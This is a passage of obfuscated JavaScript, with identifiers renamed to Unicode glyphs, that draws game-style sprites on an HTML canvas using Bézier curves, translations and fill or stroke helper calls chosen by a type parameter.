			Δ.bezierCurveTo(59 * ᐃ, ᐃ * 24, ᐃ * 56, 25 * ᐃ, 53 * ᐃ, ᐃ * 24);
			Δ.bezierCurveTo(67 * ᐃ, ᐃ * 15, ᐃ * 84, ΔᐃⵠⲆⵠ * ᐃ, ᐃ * 120, ᐃ * 16);
			Δ.bezierCurveTo(ᐃ * 107, ᐃ * 11, 96 * ᐃ, ᐃ * 6, ᐃ * 85, ΔⲆΔΔΔ * ᐃ);
			Δ.bezierCurveTo(59 * ᐃ, ᐃ * ⲆⲆΔⲆ, ᐃ * 54, ᐃⵠⲆᐃΔⵠᐃ * ᐃ, ᐃ * 40, ⵠᐃⵠⲆⲆ * ᐃ);
			Δ.bezierCurveTo(32.5 * ᐃ, 22.5 * ᐃ, ᐃ * 32.5, ᐃ * 22.5, ᐃ * 25, ᐃ * 28);
			Δ.bezierCurveTo(32 * ᐃ, ᐃ * 30, ᐃ * 32, ᐃ * 30, ᐃ * 39, ᐃ * 32);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 24, ᐃ * 28);
			Δ.bezierCurveTo(ᐃ * 39, ᐃ * 30, ᐃ * 37, ᐃ * 31, 40 * ᐃ, 32 * ᐃ);
			Δ.bezierCurveTo(22 * ᐃ, 45 * ᐃ, ᐃ * 26, 58 * ᐃ, ᐃ * 29, ᐃ * 66);
			Δ.bezierCurveTo(86.5 * ᐃ, 65 * ᐃ, 86.5 * ᐃ, ᐃ * 65, ᐃ * 144, 64 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 151, ᐃ * 42, ᐃ * 132, ᐃ * ᐃᐃⵠⵠⲆ, ᐃ * 120, ᐃ * ⵠΔⵠΔΔ);
			Δ.bezierCurveTo(ᐃ * 106, ⵠⲆᐃᐃⲆ * ᐃ, 89 * ᐃ, ᐃ * ΔⲆⲆ, 73 * ᐃ, ᐃ * 3);
			Δ.bezierCurveTo(ᐃ * 51, ΔⵠⲆⲆ * ᐃ, 36 * ᐃ, 20 * ᐃ, ᐃ * 25, ᐃ * 28);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⲆⵠⲆ], ᐃⵠⵠΔ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃΔΔⵠᐃ * ᐃ, 38 * ᐃ, 14.866068747318506 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆⲆ], Ⲇᐃ[ΔⵠⲆⲆ], ⵠΔΔᐃΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 39, 30 * ᐃ);
			Δ.bezierCurveTo(27 * ᐃ, 38 * ᐃ, ᐃ * 25, ᐃ * 50, 26 * ᐃ, 60 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 36.5, ᐃ * 58.5, 36.5 * ᐃ, 58.5 * ᐃ, ᐃ * 47, ᐃ * 57);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ], Ⲇᐃ[Δⵠⵠⵠ], ᐃ * ⵠⲆⵠᐃ);
			Δ.translate(ᐃ * -7, ᐃ * -20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * 55, ᐃ * 68);
			Δ.bezierCurveTo(ᐃ * 86, ᐃ * 64, ᐃ * 117, 66 * ᐃ, ᐃ * 134, ᐃ * 68);
			Δ.bezierCurveTo(ᐃ * 152, 69 * ᐃ, ᐃ * 165, ᐃ * 86, ᐃ * 152, 104 * ᐃ);
			Δ.bezierCurveTo(146 * ᐃ, 87 * ᐃ, 122 * ᐃ, ᐃ * 89, 98 * ᐃ, 90 * ᐃ);
			Δ.bezierCurveTo(64 * ᐃ, ᐃ * 89, ᐃ * 41, 91 * ᐃ, ᐃ * 36, 106 * ᐃ);
			Δ.bezierCurveTo(ⲆⵠⲆΔΔΔᐃ * ᐃ, ᐃ * 92, ᐃ * 31, 71 * ᐃ, ᐃ * 54, ᐃ * 69);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃΔ], Ⲇᐃ[ᐃⲆⵠⵠ], ⵠΔᐃΔ * ᐃ);
			return Ⲇⵠ
		}
		const ᐃⵠⲆⲆⲆ = ⵠⵠΔⲆ;

		function ΔⲆᐃΔΔ(ᐃ, Ⲇᐃ, ⵠᐃⲆ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 210;
			var ⵠⵠᐃ = ᐃ * 205;
			var w2 = ᐃⵠⵠ / 2;
			var ΔΔⵠⲆᐃ = ⵠⵠᐃ / 2;
			var ΔⵠΔΔ = 30 * ᐃ;
			var ᐃⵠΔⲆ = ⵠΔΔⲆⲆ * ᐃ;
			var ⵠᐃⵠⵠⵠ = ᐃ * 200;
			var ᐃⵠⵠⲆⲆ = ᐃ * 180;
			var ⲆⲆⵠ = ᐃ * 80;
			var ⵠⵠᐃⵠᐃ = ⵠᐃⵠⵠⵠ / 2;
			var ᐃⲆᐃᐃⵠ = ᐃⵠⵠⲆⲆ / Δᐃⵠⵠ;
			var ⵠⲆⵠ = 4;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Ⲇⵠ.width = 419 * ᐃ;
			Ⲇⵠ.height = ᐃ * 412;
			if (ⵠᐃ == 1) {
				Δ.save();
				Δ.translate(10 * ᐃ, ᐃ * 0);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 117.99996948242188, 216.40621948242188 * ᐃ);
				Δ.bezierCurveTo(86.99996948242188 * ᐃ, 221.40621948242188 * ᐃ, 74.99996948242188 * ᐃ, 217.40621948242188 * ᐃ, 60.999969482421875 * ᐃ, ᐃ * 205.40621948242188);
				ΔⲆ(Δ, ⲆᐃΔⲆᐃ, Ⲇᐃ[ᐃⲆᐃⲆⵠ], 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
				Δ.moveTo(ᐃ * 114.99996948242188, 227.40621948242188 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 90.99996948242188, 233.40621948242188 * ᐃ, 66.99996948242188 * ᐃ, 228.40621948242188 * ᐃ, ᐃ * 43.999969482421875, ᐃ * 225.40621948242188);
				ΔⲆ(Δ, undefined, Ⲇᐃ[4], ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
				Δ.moveTo(110.99996948242188 * ᐃ, ᐃ * 236.40621948242188);
				Δ.bezierCurveTo(94.99996948242188 * ᐃ, 244.40621948242188 * ᐃ, 79.99996948242188 * ᐃ, 249.40621948242188 * ᐃ, 60.999969482421875 * ᐃ, 249.40621948242188 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[4], ᐃ * ⵠⵠⵠⵠ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
				Δ.moveTo(ᐃ * 111.99996948242188, 206.29513549804688 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 91.99996948242188, 206.29513549804688 * ᐃ, 87.99996948242188 * ᐃ, 201.29513549804688 * ᐃ, 79.99996948242188 * ᐃ, 192.29513549804688 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[4], 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
				Δ.moveTo(ᐃ * 109.99996948242188, 249.18402099609375 * ᐃ);
				Δ.bezierCurveTo(97.99996948242188 * ᐃ, 263.18402099609375 * ᐃ, 85.99996948242188 * ᐃ, ᐃ * 271.18402099609375, 65.99996948242188 * ᐃ, ᐃ * 277.18402099609375);
				ΔⲆ(Δ, ⲆⲆⲆⲆᐃ, Ⲇᐃ[Ⲇᐃⵠᐃ], ΔⲆΔᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
				Δ.lineJoin = ⵠ[ΔⲆΔΔ];
				Δ.moveTo(ᐃ * 105.99996948242188, 192.18402099609375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 99.49996948242188, 197.68402099609375 * ᐃ, ᐃ * 99.49996948242188, 197.68402099609375 * ᐃ, ᐃ * 92.99996948242188, ᐃ * 203.18402099609375);
				Δ.bezierCurveTo(ᐃ * 95.99996948242188, ᐃ * 213.18402099609375, ᐃ * 95.99996948242188, 215.18402099609375 * ᐃ, ᐃ * 89.99996948242188, 219.18402099609375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 91.99996948242188, ᐃ * 223.18402099609375, ᐃ * 91.99996948242188, 226.18402099609375 * ᐃ, ᐃ * 87.99996948242188, ᐃ * 230.18402099609375);
				Δ.bezierCurveTo(89.99996948242188 * ᐃ, 234.18402099609375 * ᐃ, ᐃ * 91.99996948242188, 237.18402099609375 * ᐃ, 90.99996948242188 * ᐃ, 244.18402099609375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 96.99996948242188, ᐃ * 252.18402099609375, 96.99996948242188 * ᐃ, ᐃ * 256.18402099609375, ᐃ * 95.99996948242188, ᐃ * 262.18402099609375);
				Δ.bezierCurveTo(ᐃ * 106.49996948242188, ᐃ * 264.18402099609375, ᐃ * 106.49996948242188, ᐃ * 264.18402099609375, 116.99996948242188 * ᐃ, 266.18402099609375 * ᐃ);
				ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⵠΔᐃΔ], ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
				Δ.moveTo(104.99996948242188 * ᐃ, ᐃ * 183.29513549804688);
				Δ.bezierCurveTo(ᐃ * 99.99996948242188, ᐃ * 193.29513549804688, 93.99996948242188 * ᐃ, 195.29513549804688 * ᐃ, ᐃ * 89.99996948242188, ᐃ * 201.29513549804688);
				Δ.bezierCurveTo(ᐃ * 86.99996948242188, 212.29513549804688 * ᐃ, 85.99996948242188 * ᐃ, ᐃ * 214.29513549804688, ᐃ * 81.99996948242188, ᐃ * 215.29513549804688);
				Δ.bezierCurveTo(83.99996948242188 * ᐃ, 223.29513549804688 * ᐃ, 83.99996948242188 * ᐃ, ᐃ * 227.29513549804688, ᐃ * 79.99996948242188, ᐃ * 230.29513549804688);
				Δ.bezierCurveTo(83.99996948242188 * ᐃ, 235.29513549804688 * ᐃ, 84.99996948242188 * ᐃ, ᐃ * 240.29513549804688, 79.99996948242188 * ᐃ, 246.29513549804688 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 86.99996948242188, ᐃ * 251.29513549804688, ᐃ * 91.99996948242188, ᐃ * 256.2951354980469, ᐃ * 89.99996948242188, 266.2951354980469 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 102.99996948242188, ᐃ * 269.2951354980469, ᐃ * 102.99996948242188, ᐃ * 269.2951354980469, ᐃ * 115.99996948242188, 272.2951354980469 * ᐃ);
				ΔⲆ(Δ, ᐃⲆᐃⲆⲆ, Ⲇᐃ[4], 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(107.99996948242188 * ᐃ, ᐃ * 177.85067749023438);
				Δ.bezierCurveTo(95.99996948242188 * ᐃ, ᐃ * 187.35067749023438, ᐃ * 95.99996948242188, ᐃ * 187.35067749023438, ᐃ * 83.99996948242188, 196.85067749023438 * ᐃ);
				Δ.bezierCurveTo(82.99996948242188 * ᐃ, 203.85067749023438 * ᐃ, 80.99996948242188 * ᐃ, ᐃ * 209.85067749023438, 72.99996948242188 * ᐃ, ᐃ * 210.85067749023438);
				Δ.bezierCurveTo(73.99996948242188 * ᐃ, 220.85067749023438 * ᐃ, 73.99996948242188 * ᐃ, 221.85067749023438 * ᐃ, ᐃ * 66.99996948242188, ᐃ * 227.85067749023438);
				Δ.bezierCurveTo(ᐃ * 71.99996948242188, 235.85067749023438 * ᐃ, 73.99996948242188 * ᐃ, ᐃ * 239.85067749023438, ᐃ * 71.99996948242188, 247.85067749023438 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 80.99996948242188, ᐃ * 257.8506774902344, 81.99996948242188 * ᐃ, 263.8506774902344 * ᐃ, ᐃ * 77.99996948242188, ᐃ * 271.8506774902344);
				Δ.bezierCurveTo(95.49996948242188 * ᐃ, 272.8506774902344 * ᐃ, ᐃ * 95.49996948242188, 272.8506774902344 * ᐃ, ᐃ * 112.99996948242188, ᐃ * 273.8506774902344);
				ΔⲆ(Δ, ⵠᐃⵠⲆΔ, Ⲇᐃ[ⲆⲆⲆΔ], ΔⲆΔᐃ * ᐃ);
				Δ.restore()
			} else ΔⵠᐃⲆ == ⵠᐃ && (Δ.save(), Δ.translate(ᐃ * 130, ᐃ * 35), Δ.beginPath(), Δ.lineCap = ⵠ[ⵠᐃⲆΔ], Δ.lineJoin = ⵠ[5], Δ.moveTo(170.99996948242188 * ᐃ, 133.85067749023438 * ᐃ), Δ.bezierCurveTo(195.99996948242188 * ᐃ, 129.85067749023438 * ᐃ, ᐃ * 196.99996948242188, ᐃ * 111.85067749023438, 200.99996948242188 * ᐃ, ᐃ * 88.85067749023438), ΔⲆ(Δ, ᐃⵠᐃⵠᐃ, Ⲇᐃ[ⵠΔΔᐃΔ], ᐃ * ᐃⵠⲆΔᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(169.99996948242188 * ᐃ, 143.85067749023438 * ᐃ), Δ.bezierCurveTo(189.99996948242188 * ᐃ, 145.85067749023438 * ᐃ, 207.99996948242188 * ᐃ, ᐃ * 126.85067749023438, 222.99996948242188 * ᐃ, ᐃ * 100.85067749023438), ΔⲆ(Δ, ⵠΔᐃⲆΔ, Ⲇᐃ[ⲆⵠΔⵠ], ᐃ * ⵠⵠⵠᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[ΔΔᐃⲆ], Δ.lineJoin = ⵠ[ΔΔᐃⲆ], Δ.moveTo(ᐃ * 170.99996948242188, 157.85067749023438 * ᐃ), Δ.bezierCurveTo(193.99996948242188 * ᐃ, 160.85067749023438 * ᐃ, ᐃ * 210.99996948242188, ᐃ * 151.85067749023438, 232.99996948242188 * ᐃ, 139.85067749023438 * ᐃ), ΔⲆ(Δ, ᐃᐃⵠⵠΔ, Ⲇᐃ[ⲆⵠΔⵠ], ᐃ * 3), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ], Δ.moveTo(ᐃ * 169.99996948242188, ᐃ * 168.85067749023438), Δ.bezierCurveTo(ᐃ * 192.99996948242188, 175.85067749023438 * ᐃ, 203.99996948242188 * ᐃ, ᐃ * 177.85067749023438, ᐃ * 245.99996948242188, 168.85067749023438 * ᐃ), ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[ⵠⲆⵠᐃ], Δⵠᐃⵠ * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ⵠⵠΔΔ], Δ.moveTo(ᐃ * 167.99996948242188, 168.85067749023438 * ᐃ), Δ.bezierCurveTo(ᐃ * 183.99996948242188, 189.85067749023438 * ᐃ, ᐃ * 191.99996948242188, ᐃ * 193.85067749023438, ᐃ * 220.99996948242188, 196.85067749023438 * ᐃ), ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆΔⵠᐃ], ᐃ * ᐃⲆᐃᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[ⲆΔΔᐃ], Δ.lineJoin = ⵠ[5], Δ.moveTo(ᐃ * 176.99996948242188, 117.85067749023438 * ᐃ), Δ.bezierCurveTo(ᐃ * 181.99996948242188, ᐃ * 120.85067749023438, 181.99996948242188 * ᐃ, ᐃ * 120.85067749023438, 186.99996948242188 * ᐃ, 123.85067749023438 * ᐃ), Δ.bezierCurveTo(ᐃ * 183.99996948242188, 137.85067749023438 * ᐃ, 185.99996948242188 * ᐃ, ᐃ * 136.85067749023438, ᐃ * 190.99996948242188, 136.85067749023438 * ᐃ), Δ.bezierCurveTo(ᐃ * 186.99996948242188, 147.85067749023438 * ᐃ, 189.99996948242188 * ᐃ, 152.85067749023438 * ᐃ, ᐃ * 193.99996948242188, ᐃ * 155.85067749023438), Δ.bezierCurveTo(187.99996948242188 * ᐃ, 165.85067749023438 * ᐃ, ᐃ * 190.99996948242188, ᐃ * 169.85067749023438, ᐃ * 190.99996948242188, 172.85067749023438 * ᐃ), Δ.bezierCurveTo(ᐃ * 186.99996948242188, ᐃ * 183.85067749023438, 186.99996948242188 * ᐃ, ᐃ * 185.85067749023438, 189.99996948242188 * ᐃ, 188.85067749023438 * ᐃ), Δ.bezierCurveTo(182.49996948242188 * ᐃ, ᐃ * 195.35067749023438, ᐃ * 182.49996948242188, ᐃ * 195.35067749023438, 174.99996948242188 * ᐃ, ᐃ * 201.85067749023438), ΔⲆ(Δ, ΔⵠⲆᐃΔ, Ⲇᐃ[ⵠΔᐃΔ], ΔⲆΔᐃ * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[ⵠⵠΔⵠ], Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ], Δ.moveTo(ᐃ * 176.99996948242188, 112.18402099609375 * ᐃ), Δ.bezierCurveTo(183.99996948242188 * ᐃ, 119.18402099609375 * ᐃ, ᐃ * 186.99996948242188, 117.18402099609375 * ᐃ, ᐃ * 192.99996948242188, ᐃ * 116.18402099609375), Δ.bezierCurveTo(ᐃ * 191.99996948242188, 126.18402099609375 * ᐃ, ᐃ * 193.99996948242188, 130.18402099609375 * ᐃ, 199.99996948242188 * ᐃ, 130.18402099609375 * ᐃ), Δ.bezierCurveTo(ᐃ * 194.99996948242188, ᐃ * 145.18402099609375, 197.99996948242188 * ᐃ, 147.18402099609375 * ᐃ, 201.99996948242188 * ᐃ, ᐃ * 153.18402099609375), Δ.bezierCurveTo(196.99996948242188 * ᐃ, ᐃ * 164.18402099609375, ᐃ * 197.99996948242188, 169.18402099609375 * ᐃ, ᐃ * 201.99996948242188, 174.18402099609375 * ᐃ), Δ.bezierCurveTo(194.99996948242188 * ᐃ, ᐃ * 184.18402099609375, ᐃ * 196.99996948242188, ᐃ * 187.18402099609375, ᐃ * 200.99996948242188, ᐃ * 193.18402099609375), Δ.bezierCurveTo(185.99996948242188 * ᐃ, 195.18402099609375 * ᐃ, 181.99996948242188 * ᐃ, ᐃ * 201.18402099609375, ᐃ * 174.99996948242188, 210.18402099609375 * ᐃ), ΔⲆ(Δ, ⵠⵠΔⵠΔ, Ⲇᐃ[4], ᐃ * 3), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ᐃΔΔΔ], Δ.moveTo(ᐃ * 176.99996948242188, ᐃ * 101.29513549804688), Δ.bezierCurveTo(181.99996948242188 * ᐃ, 108.29513549804688 * ᐃ, ᐃ * 189.99996948242188, 110.29513549804688 * ᐃ, ᐃ * 195.99996948242188, 107.29513549804688 * ᐃ), Δ.bezierCurveTo(ᐃ * 197.99996948242188, 121.29513549804688 * ᐃ, 200.99996948242188 * ᐃ, 122.29513549804688 * ᐃ, ᐃ * 206.99996948242188, ᐃ * 122.29513549804688), Δ.bezierCurveTo(201.99996948242188 * ᐃ, ᐃ * 138.29513549804688, ᐃ * 204.99996948242188, 142.29513549804688 * ᐃ, 211.99996948242188 * ᐃ, 148.29513549804688 * ᐃ), Δ.bezierCurveTo(ᐃ * 201.99996948242188, 156.29513549804688 * ᐃ, 205.99996948242188 * ᐃ, 167.29513549804688 * ᐃ, 213.99996948242188 * ᐃ, ᐃ * 173.29513549804688), Δ.bezierCurveTo(204.99996948242188 * ᐃ, ᐃ * 181.29513549804688, 204.99996948242188 * ᐃ, 187.29513549804688 * ᐃ, ᐃ * 205.99996948242188, 193.29513549804688 * ᐃ), Δ.bezierCurveTo(ᐃ * 190.99996948242188, ᐃ * 198.29513549804688, 181.99996948242188 * ᐃ, 205.29513549804688 * ᐃ, ᐃ * 174.99996948242188, ᐃ * 214.29513549804688), ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, Ⲇᐃ[ⲆⵠΔⵠ], ᐃ * Δⵠᐃⵠ), Δ.restore());
			Δ.translate(Ⲇⵠ.width / ⲆⲆΔᐃ, Ⲇⵠ.height / ⵠⵠΔⲆ);
			if (!ⵠᐃ) {
				Δ.globalAlpha = .5;
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ, -ᐃⲆᐃᐃⵠ, ⵠᐃⵠⵠⵠ, ᐃⵠⵠⲆⲆ + ᐃⵠΔⲆ, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ]);
				if (ⵠᐃⲆ) Δ.rotate(Math.PI);
				Δ.globalAlpha = 1;
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ, -ᐃⲆᐃᐃⵠ, ⵠᐃⵠⵠⵠ, ᐃⵠⵠⲆⲆ, ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⲆⲆ], Ⲇᐃ[2], ⵠⲆⵠ);
				Δ.globalAlpha = 1;
				Ⲇᐃᐃ(Δ, -ⵠⵠᐃⵠᐃ + 35 * ᐃ, -ᐃⲆᐃᐃⵠ + 20 * ᐃ, ⵠᐃⵠⵠⵠ - ᐃ * 50, ᐃⵠⵠⲆⲆ - ᐃ * 50, ΔⵠΔΔ - ᐃΔᐃΔⲆ * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⲆ])
			}
			if (ⵠᐃ == ⵠⵠⵠⵠ) {
				Δ.translate(-Ⲇⵠ.width / ᐃⵠⲆⲆⲆ, -Ⲇⵠ.height / 2);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
				Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
				Δ.moveTo(ᐃ * 121, ᐃ * 190);
				Δ.bezierCurveTo(129 * ᐃ, ᐃ * 186, ᐃ * 137, ᐃ * 183, ᐃ * 135, 163 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 131, ᐃ * 135, ᐃ * 153, ᐃ * 127, 177 * ᐃ, 124 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 198, 120 * ᐃ, ᐃ * 208, ᐃ * 122, ᐃ * 226, ᐃ * 128);
				Δ.bezierCurveTo(ᐃ * 261, 112 * ᐃ, 271 * ᐃ, ᐃ * 126, 287 * ᐃ, 147 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 310, 163 * ᐃ, 304 * ᐃ, 183 * ᐃ, ᐃ * 283, 196 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 296, ᐃ * 249, 278 * ᐃ, ᐃ * 262, 253 * ᐃ, 263 * ᐃ);
				Δ.bezierCurveTo(210 * ᐃ, ᐃ * 264, ᐃ * 188, ᐃ * 252, ᐃ * 177, 234 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 133, ᐃ * 242, 123 * ᐃ, 241 * ᐃ, ᐃ * 115, 225 * ᐃ);
				Δ.bezierCurveTo(109 * ᐃ, 206 * ᐃ, ᐃ * 115, 193 * ᐃ, ᐃ * 121, 190 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 219, 144 * ᐃ);
				Δ.bezierCurveTo(251 * ᐃ, ᐃ * 121, 277 * ᐃ, 136 * ᐃ, ᐃ * 276, 159 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 276, 176 * ᐃ, 273 * ᐃ, 191 * ᐃ, ᐃ * 242, 193 * ᐃ);
				Δ.bezierCurveTo(226 * ᐃ, 228 * ᐃ, ᐃ * 155, 219 * ᐃ, 150 * ᐃ, ᐃ * 183);
				Δ.bezierCurveTo(142 * ᐃ, ᐃ * 144, ᐃ * 174, ᐃ * 127, ᐃ * 219, 144 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[5]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 123, 214 * ᐃ);
				Δ.bezierCurveTo(119 * ᐃ, ᐃ * 198, 129 * ᐃ, ᐃ * 189, 146 * ᐃ, 194 * ᐃ);
				Δ.bezierCurveTo(158 * ᐃ, 201 * ᐃ, ᐃ * 165, ᐃ * 218, ᐃ * 147, 226 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 135, ᐃ * 230, ᐃ * 125, ᐃ * 222, ᐃ * 123, 214 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[5]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(257 * ᐃ, ᐃ * 199);
				Δ.bezierCurveTo(ᐃ * 264, 199 * ᐃ, 275 * ᐃ, 213 * ᐃ, 261 * ᐃ, ᐃ * 220);
				Δ.bezierCurveTo(ᐃ * 246, ᐃ * 225, ᐃ * 235, 200 * ᐃ, 257 * ᐃ, 199 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃᐃ]);
				Δ.translate(-5 * ᐃ, ᐃ * 55);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃΔΔΔ];
				Δ.moveTo(186 * ᐃ, 123 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 198, ᐃ * 115, 219 * ᐃ, ᐃ * 110, ᐃ * 219, ᐃ * 123);
				Δ.bezierCurveTo(ᐃ * 216, 135 * ᐃ, ᐃ * 171, 143 * ᐃ, 186 * ᐃ, ᐃ * 123);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[5]);
				Δ.translate(5 * ᐃ, -55 * ᐃ);
				Δ.translate(-5 * ᐃ, 15 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⲆΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 171, ᐃ * 241);
				Δ.bezierCurveTo(189 * ᐃ, ᐃ * 234, ᐃ * 200, 248 * ᐃ, 189 * ᐃ, 254 * ᐃ);
				Δ.bezierCurveTo(179 * ᐃ, ᐃ * 260, 158 * ᐃ, ᐃ * 246, ᐃ * 171, ᐃ * 241);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[5])
			} else if (ⵠΔᐃΔ == ⵠᐃ) {
				Δ.translate(-Ⲇⵠ.width / ᐃⲆⵠᐃ, -Ⲇⵠ.height / 2);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
				Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
				Δ.moveTo(30 * ᐃ, 167 * ᐃ);
				Δ.bezierCurveTo(47 * ᐃ, 144 * ᐃ, 64 * ᐃ, 140 * ᐃ, 80 * ᐃ, 147 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 95, 154 * ᐃ, 95 * ᐃ, ᐃ * 159, ᐃ * ᐃΔⲆⲆᐃ, ᐃ * 179);
				Δ.bezierCurveTo(105 * ᐃ, 202 * ᐃ, ᐃ * 95, ᐃ * 218, ᐃ * 69, 218 * ᐃ);
				Δ.bezierCurveTo(48 * ᐃ, ᐃ * 236, ᐃ * 26, 223 * ᐃ, 28 * ᐃ, 213 * ᐃ);
				Δ.bezierCurveTo(28 * ᐃ, ᐃ * 205, 29 * ᐃ, ᐃ * 199, ᐃ * 32, 195 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 21, 183 * ᐃ, 27 * ᐃ, ᐃ * 173, 30 * ᐃ, ᐃ * 167);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[4]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔΔᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(26 * ᐃ, 145 * ᐃ);
				Δ.bezierCurveTo(32 * ᐃ, 138 * ᐃ, ᐃ * 37, ᐃ * 137, ᐃ * 40, 139 * ᐃ);
				Δ.bezierCurveTo(43 * ᐃ, 140 * ᐃ, ᐃ * 41, ᐃ * 150, 31 * ᐃ, ᐃ * 159);
				Δ.bezierCurveTo(ᐃ * 23, 166 * ᐃ, ᐃ * ΔΔΔᐃᐃⵠΔ, 158 * ᐃ, 26 * ᐃ, 145 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔᐃⵠⵠⲆ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
				Δ.lineJoin = ⵠ[ΔⲆΔΔ];
				Δ.moveTo(ᐃ * ⵠᐃᐃΔⲆ, ᐃ * 193);
				Δ.bezierCurveTo(ᐃ * 21, 187 * ᐃ, ᐃ * 30, 190 * ᐃ, ⵠⵠΔΔᐃ * ᐃ, ᐃ * 202);
